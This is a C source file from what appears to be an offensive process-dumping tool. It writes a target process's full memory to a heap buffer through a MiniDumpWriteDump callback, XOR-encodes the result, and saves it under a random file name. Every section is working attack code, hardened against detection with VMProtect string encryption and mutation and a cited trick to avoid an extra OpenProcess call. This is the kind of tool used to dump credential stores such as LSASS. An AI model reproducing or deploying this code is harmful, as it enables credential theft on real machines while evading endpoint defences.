#include "Dump.h"

BOOL MiniDump(HANDLE hTarget, DWORD TargetPid)
{

	printf(VMProtectDecryptStringA("[+] Dumping PID %d via MiniDumpWriteDump\n"), TargetPid);

	CallbackHelper helper;
	helper.bytesRead = 0;
	helper.dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 150);
	if (helper.dumpBuffer == NULL)
	{
		printf(VMProtectDecryptStringA("[-] Failed to allocate heap memory for the minidump callback\n"));
		GetError(L"HeapAlloc");
		return FALSE;
	}
	VMProtectBeginMutation("MiniDump");
	MINIDUMP_CALLBACK_INFORMATION callbackInfo = { 0 };
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = &helper;

	// PID is 0 to avoid additional OpenProcess by MiniDumpWriteDump's RtlQueryProcessDebugInformation (Credit goes to @_RastaMouse for this trick)
	BOOL Dumped = MiniDumpWriteDump(hTarget, 0, 0, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
	VMProtectEnd();
	if (!Dumped)
	{
		GetError((PWSTR)VMProtectDecryptStringW(L"MiniDumpWriteDump"));
		goto ReturnFalse;
	}

	printf(VMProtectDecryptStringA("[+] Target process has been dumped to memory successfully\n"));
	if (TRUE)
	{
		DWORD i;
		for (i = 0; i <= helper.bytesRead; i++)
		{
			*((BYTE*)helper.dumpBuffer + i) = *((BYTE*)helper.dumpBuffer + i) ^ 0x4B;
		}
	}



	WCHAR FileName[100] = { 0 };
	GenerateOutFileName(FileName);
	HANDLE hOutFile = CreateFile(FileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutFile == INVALID_HANDLE_VALUE)
	{
		printf(VMProtectDecryptStringA("[-] Failed to create the output file\n"));
		GetError((PWSTR)VMProtectDecryptStringW(L"CreateFile"));
		goto ReturnFalse;
	}

	printf(VMProtectDecryptStringA("[+] Writing process dump to disk\n"));

	if (!WriteFile(hOutFile, helper.dumpBuffer, helper.bytesRead, NULL, NULL))
	{
		printf(VMProtectDecryptStringA("[-] Failed to write dump to outfile\n"));
		GetError((PWSTR)VMProtectDecryptStringW(L"WriteFile"));
		CloseHandle(hOutFile);
		DeleteFile(FileName);
		goto ReturnFalse;
	}
	printf(VMProtectDecryptStringA("[+] Process dump of PID %d written to outfile: %S\n"), TargetPid, FileName);

ReturnTrue:
	HeapFree(GetProcessHeap(), 0, helper.dumpBuffer);
	helper.dumpBuffer = NULL;
	return TRUE;

ReturnFalse:
	HeapFree(GetProcessHeap(), 0, helper.dumpBuffer);
	helper.dumpBuffer = NULL;
	return FALSE;
}


void GetError(WCHAR* FunctionName)
{
	DWORD ErrorCode = GetLastError();
	LPTSTR ErrorText = NULL;

	FormatMessage(
		FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		ErrorCode,
		LANG_SYSTEM_DEFAULT,
		ErrorText,
		0,
		NULL);

	printf(VMProtectDecryptStringA("[-] The function %S failed with error code %d - %S"), FunctionName, ErrorCode, ErrorText);
	LocalFree(ErrorText);
}

void GenerateOutFileName(WCHAR* pFileName) {

	srand(time(0));
	for (int i = 0; i < 10; i++)
	{
		if (i == 6) 
		{
			pFileName[6] = '.';
			continue;
		}
		pFileName[i] = VMProtectDecryptStringA("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")[rand() % 52];
	}

	return;
}

BOOL CALLBACK minidumpCallback(
	PVOID callbackParam,
	const PMINIDUMP_CALLBACK_INPUT callbackInput,
	PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	pCallbackHelper helper = (pCallbackHelper)callbackParam;

	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

	case IoWriteAllCallback:
		VMProtectBeginMutation("minidumpCallback");
		callbackOutput->Status = S_OK;
		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)helper->dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
		bufferSize = callbackInput->Io.BufferBytes;
		helper->bytesRead += bufferSize;
		RtlCopyMemory(destination, source, bufferSize);
		VMProtectEnd();
		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return TRUE;
	}
	return TRUE;
}
